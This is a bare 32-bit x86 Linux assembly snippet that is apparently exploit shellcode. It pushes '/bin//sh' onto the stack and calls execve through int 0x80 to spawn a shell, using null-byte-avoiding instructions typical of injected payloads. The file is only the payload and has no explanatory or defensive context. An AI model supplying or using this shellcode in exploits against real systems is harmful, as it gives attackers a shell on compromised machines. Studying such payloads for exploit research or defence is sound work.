section .text:
global _start:
_start:
	xor eax, eax
	push eax
	cdq
	; /bin//sh	
	push 0x68732f2f
	push 0x6e69622f
	push esp
	pop ebx
	xor ecx,ecx
	mov al, 11
	int 0x80
